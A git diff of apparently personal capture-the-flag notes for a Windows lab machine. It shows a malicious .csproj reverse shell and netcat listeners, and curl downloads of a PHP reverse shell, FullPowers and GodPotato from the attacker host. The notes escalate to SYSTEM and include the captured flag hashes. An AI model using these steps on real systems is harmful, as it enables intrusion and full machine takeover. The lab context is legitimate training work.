@@ -9,31 +9,157 @@
 	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 	Nmap done: 1 IP address (1 host up) scanned in 10.61 seconds
 
-> gobuster dir -u 10.10.11.234 -w /usr/share/wordlists/dirb/big.txt -x php,html -r -b 403,404 -t 50
-	===============================================================
-	Gobuster v3.6
-	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-	===============================================================
-	[+] Url:                     http://10.10.11.234
-	[+] Method:                  GET
-	[+] Threads:                 50
-	[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
-	[+] Negative Status codes:   403,404
-	[+] User Agent:              gobuster/3.6
-	[+] Extensions:              php,html
-	[+] Follow Redirect:         true
-	[+] Timeout:                 10s
-	===============================================================
-	Starting gobuster in directory enumeration mode
-	===============================================================
-	/Index.php            (Status: 200) [Size: 7534]
-	/assets               (Status: 200) [Size: 987]
-	/css                  (Status: 200) [Size: 978]
-	/examples             (Status: 503) [Size: 402]
-	/index.php            (Status: 200) [Size: 7534]
-	/js                   (Status: 200) [Size: 979]
-	/submit.php           (Status: 200) [Size: 0]
-	Progress: 61407 / 61410 (100.00%)
-	===============================================================
-	Finished
-	===============================================================
+> docker run --network host gitea/gitea:latest
+> open http://localhost:3000 and configure new user and new repos
+> create a visual studio console .net project and add revshell through ms preload in .csproj
+> upload HelloWorld.git with malicious .csproj
+> compile git addres on website and get reverseshell
+
+> rlwrap nc -lvp 4242
+	listening on [any] 4242 ...
+	10.10.11.234: inverse host lookup failed: Unknown host
+	connect to [10.10.14.5] from (UNKNOWN) [10.10.11.234] 49672
+	cd c:\
+	dir
+		PerfLogs
+		Program
+		Files
+		Program
+		Files (x86)
+		Users
+		Windows
+		xampp
+	whoami
+		visual\enox
+	cd Users
+	dir
+		Administrator
+		enox
+		Public
+	cd enox
+	dir
+		Desktop
+		Documents
+		Downloads
+		Favorites
+		Links
+		Music
+		Pictures
+		Saved
+		Games
+		Videos
+	cd Desktop
+	dir
+		user.txt
+	cat user.txt
+		9d9007fa59eb3dcc9822f829132101eb
+	cd c:/xampp
+	dir
+		apache
+		cgi-bin
+		contrib
+		FileZillaFTP
+		htdocs
+		...
+		xampp-control.ini
+		xampp_start.exe
+		xampp_stop.exe
+	cd htdocs
+	dir
+		assets
+		css
+		js
+		uploads
+		index.php
+		submit.php
+		vs_status.php
+(> edit revshell IP and PORT + python3 -m http.server 2424 + rlwrap nc -lvp 6969) 
+	curl http://10.10.14.5:2424/revshell.php -UseBasicParsing -OutFile revshell.php
+	dir
+		assets
+		css
+		js
+		uploads
+		index.php
+		revshell.php
+		submit.php
+		vs_status.php
+	exit	
+
+> visite http://10.10.11.234/revshell.php
+
+> rlwrap nc -lvp 6969
+	listening on [any] 6969 ...
+	10.10.11.234: inverse host lookup failed: Unknown host
+	connect to [10.10.14.5] from (UNKNOWN) [10.10.11.234] 49675
+	SOCKET: Shell has connected! PID: 992
+	Microsoft Windows [Version 10.0.17763.4851]
+	(c) 2018 Microsoft Corporation. All rights reserved.
+
+	C:\xampp\htdocs>whoami
+		nt authority\local service
+	C:\xampp\htdocs>whoami /priv
+		PRIVILEGES INFORMATION
+		----------------------
+		Privilege Name                Description                    State   
+		============================= ============================== ========
+		SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+		SeCreateGlobalPrivilege       Create global objects          Enabled
+		SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+(> no SeImpersonatePrivilege)
+(> abuse SeImpersonatePrivilege)
+	C:\xampp\htdocs>curl http://10.10.14.5:2424/FullPowers.exe > FullPowers.exe
+		  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+						 Dload  Upload   Total   Spent    Left  Speed
+		100 36864  100 36864    0     0   506k      0 --:--:-- --:--:-- --:--:--  507k
+	C:\xampp\htdocs>curl http://10.10.14.5:2424/GodPotato.exe > GodPotato.exe
+		  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+						 Dload  Upload   Total   Spent    Left  Speed
+		100 57344  100 57344    0     0   384k      0 --:--:-- --:--:-- --:--:--  386k
+	C:\xampp\htdocs>FullPowers.exe
+		[+] Started dummy thread with id 2312
+		[+] Successfully created scheduled task.
+		[+] Got new token! Privilege count: 7
+		[+] CreateProcessAsUser() OK
+		Microsoft Windows [Version 10.0.17763.4851]
+		(c) 2018 Microsoft Corporation. All rights reserved.
+	C:\Windows\system32>whoami /priv
+		PRIVILEGES INFORMATION
+		----------------------
+		Privilege Name                Description                               State  
+		============================= ========================================= =======
+		SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
+		SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
+		SeAuditPrivilege              Generate security audits                  Enabled
+		SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+		SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+		SeCreateGlobalPrivilege       Create global objects                     Enabled
+		SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+	c:\xampp\htdocs>cd c:/xampp/htdocs
+	c:\xampp\htdocs>GodPotato.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.txt"
+		[*] CombaseModule: 0x140713108635648
+		[*] DispatchTable: 0x140713110941808
+		[*] UseProtseqFunction: 0x140713110317984
+		[*] UseProtseqFunctionParamCount: 6
+		[*] HookRPC
+		[*] Start PipeServer
+		[*] CreateNamedPipe \\.\pipe\376c1945-f78a-43a3-93cb-698846e29661\pipe\epmapper
+		[*] Trigger RPCSS
+		[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+		[*] DCOM obj IPID: 00000802-02f0-ffff-471d-9ff6cc4496a9
+		[*] DCOM obj OXID: 0x8785497042a94e6f
+		[*] DCOM obj OID: 0x8cbab7253877055
+		[*] DCOM obj Flags: 0x281
+		[*] DCOM obj PublicRefs: 0x0
+		[*] Marshal Object bytes len: 100
+		[*] UnMarshal Object
+		[*] Pipe Connected!
+		[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+		[*] CurrentsImpersonationLevel: Impersonation
+		[*] Start Search System Token
+		[*] PID : 872 Token:0x808  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+		[*] Find System Token : True
+		[*] UnmarshalObject: 0x80070776
+		[*] CurrentUser: NT AUTHORITY\SYSTEM
+		[*] process start with pid 4708
+		37a53399744fd681bbb30a842b7d2f4b
